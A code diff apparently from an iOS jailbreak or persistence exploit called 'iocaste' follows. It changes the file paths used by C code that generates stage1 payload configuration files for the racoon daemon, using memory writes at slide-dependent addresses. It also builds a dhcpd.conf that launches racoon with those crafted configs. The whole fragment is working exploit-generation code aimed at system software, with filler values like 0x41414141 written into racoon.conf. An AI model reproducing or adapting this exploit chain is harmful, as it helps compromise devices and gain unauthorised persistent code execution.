@@ -102,7 +102,7 @@ static int gen_stage1_part(const char *output, uint32_t start_slide, uint32_t en
     
     uint32_t stage2_path_addr = iocaste->stage1.stack_base + 0x170;
     uint64_t stage2_path_data[3] = {0};
-    memcpy(stage2_path_data, "/etc/racoon/stage2", strlen("/etc/racoon/stage2")+1);
+    memcpy(stage2_path_data, "/mnt1/private/etc/racoon/stage2", strlen("/mnt1/private/etc/racoon/stage2")+1);
 
     conf_write64(fd, stage2_path_addr+0x0, stage2_path_data[0]);
     conf_write64(fd, stage2_path_addr+0x8, stage2_path_data[1]);
@@ -184,7 +184,7 @@ static int gen_stage1_part(const char *output, uint32_t start_slide, uint32_t en
 }
 
 int gen_stage1(void) {
-    int fd = open("/etc/dhcpd.conf", O_RDWR|O_CREAT, 0777);
+    int fd = open("/mnt1/private/etc/dhcpd.conf", O_RDWR|O_CREAT, 0777);
     if (fd < 0) {
         fprintf(stderr, "[-] failed to create /etc/dhcpd.conf\n");
         return -1;
@@ -200,7 +200,7 @@ int gen_stage1(void) {
         if (part_size > start_slide) end_slide = 0;
 
         char buf[PATH_MAX] = {0};
-        snprintf(buf, PATH_MAX-1, "/var/root/iocaste/stage1/part%u.conf", part_idx);
+        snprintf(buf, PATH_MAX-1, "/mnt1/private/var/root/iocaste/stage1/part%u.conf", part_idx);
         unlink(buf);
 
         gen_stage1_part(buf, start_slide, end_slide);
@@ -208,7 +208,7 @@ int gen_stage1(void) {
         chown(buf, 0, 0);
 
         bzero(buf, PATH_MAX);
-        snprintf(buf, PATH_MAX-1, "execute(\"/usr/sbin/racoon\", \"-l\", \"/var/log/racoon.log\", \"-f\", \"/var/root/iocaste/stage1/part%u.conf\");\n", part_idx++);
+        snprintf(buf, PATH_MAX-1, "execute(\"/mnt1/usr/sbin/racoon\", \"-l\", \"/mnt1/private/var/log/racoon.log\", \"-f\", \"/mnt1/private/var/root/iocaste/stage1/part%u.conf\");\n", part_idx++);
         write(fd, buf, strlen(buf));
     }
 
@@ -216,7 +216,7 @@ int gen_stage1(void) {
     fcntl(fd, F_FULLFSYNC);
     close(fd);
 
-    fd = open("/etc/racoon/racoon.conf", O_RDWR|O_CREAT, 0777);
+    fd = open("/mnt1/private/etc/racoon/racoon.conf", O_RDWR|O_CREAT, 0777);
     if (fd >= 0) {
         conf_write32(fd, 0x13371337, 0x41414141);
         conf_write32(fd, 0x12345678, 0x41414141);
